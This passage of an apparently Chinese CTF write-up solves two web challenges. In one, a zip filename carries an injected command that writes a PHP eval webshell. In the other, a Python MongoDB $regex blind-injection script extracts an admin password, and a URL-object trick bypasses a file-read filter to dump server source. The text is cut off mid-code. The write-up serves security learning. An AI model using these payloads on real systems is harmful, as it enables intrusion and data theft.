class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">putFileAs</span>(<span class="params"><span class="variable">$path</span>, <span class="variable">$file</span>, <span class="variable">$name</span>, <span class="variable">$options</span> = []</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"> <span class="variable">$supported_file</span> = <span class="keyword">array</span>(<span class="string">&#x27;gif&#x27;</span>,<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;jpeg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;ico&#x27;</span>,<span class="string">&#x27;zip&#x27;</span>,<span class="string">&#x27;mp4&#x27;</span>,<span class="string">&#x27;mp3&#x27;</span>,<span class="string">&#x27;mkv&#x27;</span>,<span class="string">&#x27;avi&#x27;</span>,<span class="string">&#x27;txt&#x27;</span>);</span><br><span class="line"> <span class="variable">$file_type</span>= <span class="title function_ invoke__">strtolower</span>(<span class="title function_ invoke__">pathinfo</span>(<span class="variable">$name</span>,PATHINFO_EXTENSION));</span><br><span class="line"> <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_type</span>, <span class="variable">$supported_file</span>)) &#123;</span><br><span class="line"> <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="variable">$stream</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$file</span>-&gt;<span class="title function_ invoke__">getRealPath</span>(), <span class="string">&#x27;r+&#x27;</span>);</span><br><span class="line"> <span class="variable">$result</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">put</span>(</span><br><span class="line"> <span class="variable">$path</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$path</span>.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$name</span>, <span class="string">&#x27;/&#x27;</span>), <span class="variable">$stream</span>, <span class="variable">$options</span></span><br><span class="line"> );</span><br><span class="line"> <span class="keyword">if</span> (<span class="title function_ invoke__">is_resource</span>(<span class="variable">$stream</span>)) &#123;</span><br><span class="line"> <span class="title function_ invoke__">fclose</span>(<span class="variable">$stream</span>);</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">if</span>(<span class="variable">$file</span>-&gt;<span class="title function_ invoke__">getClientOriginalExtension</span>() === <span class="string">&quot;zip&quot;</span>) &#123;</span><br><span class="line"> <span class="variable">$fs</span> = <span class="title function_ invoke__">popen</span>(<span class="string">&quot;unzip -oq &quot;</span>. <span class="variable">$this</span>-&gt;driver-&gt;<span class="title function_ invoke__">getAdapter</span>()-&gt;<span class="title function_ invoke__">getPathPrefix</span>() . </span><br><span class="line"><span class="variable">$name</span> .<span class="string">&quot; -d &quot;</span> . <span class="variable">$this</span>-&gt;driver-&gt;<span class="title function_ invoke__">getAdapter</span>()-&gt;<span class="title function_ invoke__">getPathPrefix</span>(),<span class="string">&quot;w&quot;</span>);</span><br><span class="line"> <span class="title function_ invoke__">pclose</span>(<span class="variable">$fs</span>);</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">return</span> <span class="variable">$result</span> ? <span class="variable">$path</span> : <span class="literal">false</span>;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>就是多了这段代码，和题目说的增加了有个新功能相对应</p><p><strong>这里的话是有有个自动解压的功能，那么我们就可以尝试在这里的把自己想要的命令放进压缩包里，然后解压到自己设置的目录下</strong></p><p><img src="../images/image-20230503184537985.png" alt="image-20230503184537985"></p><p>题目这里也给提示了，就是去找解压的函数方法那边</p><p><code>$file_type= strtolower(pathinfo($name,PATHINFO_EXTENSION));</code>里面的这段代码是获取文件后缀的</p><p><img src="../images/image-20230503184215304.png" alt="image-20230503184215304"></p><p><img src="../images/image-20230503184459019.png" alt="image-20230503184459019"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1;echo ZWNobyAnPD9waHAgZXZhbCgkX1BPU1RbMV0pOz8+JyA+IC92YXIvd3d3L2h0bWwvcHVibGljLzEucGhw|base64 -</span><br><span class="line">d|bash;.zip</span><br></pre></td></tr></table></figure><p>这里的目的是把一句话木马写进来</p><p><img src="../images/image-20230503193106552.png" alt="image-20230503193106552"></p><p>能进行判断通过</p><p><img src="../images/image-20230503193143283.png" alt="image-20230503193143283"></p><p>这里的话就得在文件名出写码了</p><p><img src="../images/image-20230503193317019.png" alt="image-20230503193317019"></p><p>随便上传一个zip文件并抓包</p><p>内容随便</p><p><img src="../images/image-20230503193352762.png" alt="image-20230503193352762"></p><p>这个代码的意思是将base64解码后，然后用bash命令进行执行</p><p><code>echo &#39;&lt;?php eval($_POST[1]);?&gt;&#39; &gt; /var/www/html/public/1.php</code></p><p>这就是等会执行的命令</p><p><img src="../images/image-20230503193609807.png" alt="image-20230503193609807"></p><p>成功进行执行了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$fs = popen(&quot;unzip -oq &quot;. $this-&gt;driver-&gt;getAdapter()-&gt;getPathPrefix() . $name .&quot; -d &quot; . $this-&gt;driver-&gt;getAdapter()-&gt;getPathPrefix(),&quot;w&quot;);</span><br></pre></td></tr></table></figure><p>这段代码就是把上传文件的压缩文件的地址给解压到当前地址</p><p><code>unzip -oq /xxx/xxx/xxx/1.zip -d /xxx/xxx/xxx/</code></p><p>这个1.zip处就是我们可控的文件名，然后就可以利用分号隔开，然后进行我们想要执行的其他命令了</p><h2 id="d3node"><a href="#d3node" class="headerlink" title="d3node"></a>d3node</h2><p>题目</p><p><img src="../images/image-20230503194127075.png" alt="image-20230503194127075"></p><p>查看第一个hint后，发现是nosql注入里的<strong>MongoDB</strong>注入</p><p><img src="../images/image-20230503194941896.png" alt="image-20230503194941896"></p><p><a href="https://xz.aliyun.com/t/9908#toc-4">Nosql 注入从零到一</a></p><p>可以从这篇文章来进行学习</p><p><img src="../images/image-20230503195510880.png" alt="image-20230503195510880"></p><p>输入过滤的词会输出Hacker</p><p>输入错误的密码是会输出下面的东西</p><p><img src="../images/image-20230503195603571.png" alt="image-20230503195603571"></p><p>使用<code>password[$regex]=.*&amp;username=admin</code></p><p><strong>但是这个方法登录的不是admin用户</strong></p><p><strong>这个就是对密码的正则匹配，这里的话是使用通配符来匹配</strong>(上面给的nosql的文章里讲的很清楚这个正则匹配)</p><p><img src="../images/image-20230504193625735.png" alt="image-20230504193625735"></p><p>这个也行，就是</p><p>盲注脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"></span><br><span class="line">dicts = <span class="string">&#x27;0123456789AaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZz&#x27;</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> dicts:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;testing&#x27;</span>, s)</span><br><span class="line">        url = <span class="string">&#x27;http://47.102.98.112:32299/user/LoginIndex&#x27;</span></span><br><span class="line">        res = requests.post(url,data=json.dumps(&#123;<span class="string">&#x27;username&#x27;</span>: <span class="string">&#x27;admin&#x27;</span>, <span class="string">&#x27;password&#x27;</span>: &#123;<span class="string">&#x27;$regex&#x27;</span>: <span class="string">&#x27;^&#x27;</span> + flag + s&#125;&#125;), headers=&#123;<span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span>&#125;)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Hacker&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;error&#x27;</span>)</span><br><span class="line">            quit()</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;invalid&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            flag += s</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;found!!!&#x27;</span>, flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>然后就跟据invalid的出现的标志来判断密码</p><p>最好爆出密码为  <code>dob2xdriaqpytdyh6jo3</code></p><p>然后进行登录</p><p><img src="../images/image-20230503195900909.png" alt="image-20230503195900909"></p><p>查看源码后发现第二个hint</p><p><img src="../images/image-20230503195943805.png" alt="image-20230503195943805"></p><p><img src="../images/image-20230503201834175.png" alt="image-20230503201834175"></p><p>然后测试了一下是在这个目录下可以进行文件的读取 (<strong>这里会测试时因为提示给的代码中有filename这个参数</strong>)  <strong>req.query.filename</strong></p><p><img src="../images/image-20230503201931320.png" alt="image-20230503201931320"></p><p>不给读取，然后就尝试绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?filename[href]=a&amp;filena</span><br><span class="line">me[origin]=1&amp;filename[protocol]=file:&amp;filename[hostname]=&amp;filename[pathname]=./%25</span><br><span class="line">61pp.js</span><br></pre></td></tr></table></figure><p>这段代码使用了一个JavaScript对象来表示文件路径。其中，”filename”是该对象的属性名，” [href]”、”[origin]”、”[protocol]”、”[hostname]”和”[pathname]”则是该属性下的子属性。具体 来说，它们分别表示文件的链接地址、来源、协议、主机名和文件路径。 这里的%2561其实就是。如果有非ascii进行url加密，则就会变成16进制然后再进行url编码，a的16进 制是61</p><p><strong>其实就是对a进行两次url编码</strong></p><p>然后就可以成功的查看到app.js了</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&quot;express&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">&quot;body-parser&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> cookieParser = <span class="built_in">require</span>(<span class="string">&quot;cookie-parser&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> session = <span class="built_in">require</span>(<span class="string">&quot;express-session&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> stringRandom = <span class="built_in">require</span>(<span class="string">&quot;string-random&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&quot;path&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// register router</span></span><br><span class="line"><span class="keyword">const</span> indexRouter = <span class="built_in">require</span>(<span class="string">&quot;./routes/index&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> userRouter = <span class="built_in">require</span>(<span class="string">&quot;./routes/user&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> dashboardIndexRouter = <span class="built_in">require</span>(<span class="string">&quot;./routes/dashboardIndex&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">PORT</span> = <span class="number">8080</span>;</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">engine</span>(<span class="string">&#x27;html&#x27;</span>, <span class="built_in">require</span>(<span class="string">&#x27;hbs&#x27;</span>).<span class="property">__express</span>);</span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;views&#x27;</span>, path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;views&#x27;</span>));</span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;view engine&#x27;</span>, <span class="string">&#x27;ejs&#x27;</span>);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(bodyParser.<span class="title function_">urlencoded</span>(&#123; <span class="attr">extended</span>: <span class="literal">true</span> &#125;));</span><br><span class="line">app.<span class="title function_">use</span>(bodyParser.<span class="title function_">json</span>());</span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">cookieParser</span>());</span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">static</span>(path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;static&#x27;</span>)));</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">session</span>(&#123;</span><br><span class="line">    <span class="attr">secret</span>: <span class="title function_">stringRandom</span>(<span class="number">32</span>),</span><br><span class="line">    <span class="attr">resave</span>: <span class="literal">false</span>,</span><br><span class="line">    <span class="attr">saveUninitialized</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="attr">cookie</span>: &#123;</span><br><span class="line">        <span class="attr">maxAge</span>: <span class="number">1000</span> * <span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span> * <span class="number">7</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;));</span><br><span class="line"></span><br><span class="line"><span class="comment">// set router</span></span><br><span class="line">app.<span class="title function_">use</span>(<span class="string">&quot;/&quot;</span>,indexRouter);</span><br><span class="line">app.<span class="title function_">use</span>(<span class="string">&quot;/user&quot;</span>,userRouter);</span><br><span class="line">app.<span class="title function_">use</span>(<span class="string">&quot;/dashboardIndex&quot;</span>,dashboardIndexRouter);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">8080</span>,<span class="function">() =&gt;</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`App listening on <span class="subst">$&#123;PORT&#125;</span>`</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>然后根据这个代码</p><p><img src="../images/image-20230504193939368.png" alt="image-20230504193939368"></p><p><img src="../images/image-20230504194038107.png" alt="image-20230504194038107"></p><p>这就是引入的一个文件，于是我们尝试进行这个文件的读取，看里面有啥功能</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">一开始还报错是因为没有加后缀.js，就好像访问php页面不加php一样</span><br><span class="line">http://139.196.153.118:32707/dashboardIndex/ShowExampleFile?filename=/proc/self/cwd/routes/dashbo</span><br><span class="line">ardIndex.js</span><br><span class="line"></span><br><span class="line">这个路径可能也是这个框架默认的路径吧，应该和thinkphp差不多</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">http://139.196.153.118:32707/dashboardIndex/ShowExampleFile?filename=./routes/dashboardIndex.js</span><br><span class="line">上面的二种方法都可以实现</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230504194423815.png" alt="image-20230504194423815"></p><p>读取到的代码</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&quot;fs&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&quot;path&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> cp = <span class="built_in">require</span>(<span class="string">&quot;child_process&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> multer = <span class="built_in">require</span>(<span class="string">&quot;multer&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> router = express.<span class="title class_">Router</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> upload = <span class="title function_">multer</span>(&#123; <span class="attr">dest</span>: path.<span class="title function_">join</span>(__dirname,<span class="string">&quot;../public/tmp&quot;</span>)&#125;);</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">checkFileData</span>(<span class="params">fileDatas</span>)&#123;</span><br><span class="line">    <span class="keyword">const</span> blacklist = [<span class="string">&#x27;__proto__&#x27;</span>, <span class="string">&#x27;prototype&#x27;</span>, <span class="string">&#x27;constructor&#x27;</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; blacklist.<span class="property">length</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (fileDatas.<span class="title function_">includes</span>(blacklist[i])) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Get example file</span></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&quot;/ShowExampleFile&quot;</span>,<span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!req.<span class="property">session</span>.<span class="property">is_login</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">&quot;/user/LoginIndex&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>([req.<span class="property">query</span>].<span class="title function_">some</span>(<span class="function">(<span class="params">item</span>) =&gt;</span> item &amp;&amp; <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(item).<span class="title function_">includes</span>(<span class="string">&quot;app&quot;</span>)))&#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">send</span>(<span class="string">&quot;Hacker!!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">send</span>(fs.<span class="title function_">readFileSync</span>(req.<span class="property">query</span>.<span class="property">filename</span> || <span class="string">&quot;./example/example.json&quot;</span>).<span class="title function_">toString</span>());</span><br><span class="line">    &#125;<span class="keyword">catch</span>(err)&#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">send</span>(<span class="string">&quot;Internal server error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Homepage</span></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&quot;/Home&quot;</span>,<span class="function">(<span class="params">req,res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span>(!req.<span class="property">session</span>.<span class="property">is_login</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">&quot;/user/LoginIndex&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&quot;dashboardIndex&quot;</span>,&#123;<span class="attr">message</span>:<span class="string">&quot;Welcome back&quot;</span>,<span class="attr">session_user</span>:<span class="string">&quot;Hello,&quot;</span>+req.<span class="property">session</span>.<span class="property">user</span>&#125;);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&quot;/getHint2&quot;</span>,<span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!req.<span class="property">session</span>.<span class="property">is_login</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">&quot;/user/LoginIndex&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">const</span> hintName = <span class="string">&quot;hint2.png&quot;</span>;</span><br><span class="line">    <span class="keyword">const</span> options = &#123;</span><br><span class="line">        <span class="attr">root</span>: path.<span class="title function_">join</span>(__dirname,<span class="string">&quot;../hints&quot;</span>)</span><br><span class="line">    &#125;;</span><br><span class="line">    res.<span class="title function_">sendFile</span>(hintName,options,<span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(err)&#123;</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">send</span>(<span class="string">&quot;Get hint2 error&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// show uploaded files</span></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&quot;/UploadList&quot;</span>,<span class="function">(<span class="params">req,res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span>(!req.<span class="property">session</span>.<span class="property">is_login</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">&quot;/user/LoginIndex&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> lists = fs.<span class="title function_">readdirSync</span>(path.<span class="title function_">join</span>(__dirname,<span class="string">&quot;../public/upload&quot;</span>));</span><br><span class="line">    <span class="keyword">if</span> (lists.<span class="property">length</span> === <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&quot;dashboardIndex&quot;</span>,&#123;<span class="attr">message</span>: <span class="string">&quot;No uploaded files&quot;</span>,<span class="attr">session_user</span>:<span class="string">&quot;Hello,&quot;</span>+req.<span class="property">session</span>.<span class="property">user</span>&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&quot;dashboardIndex&quot;</span>,&#123;<span class="attr">message</span>: lists,<span class="attr">session_user</span>:<span class="string">&quot;Hello,&quot;</span>+req.<span class="property">session</span>.<span class="property">user</span>&#125;);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// show packed files</span></span><br><span class="line">router.<span class="title 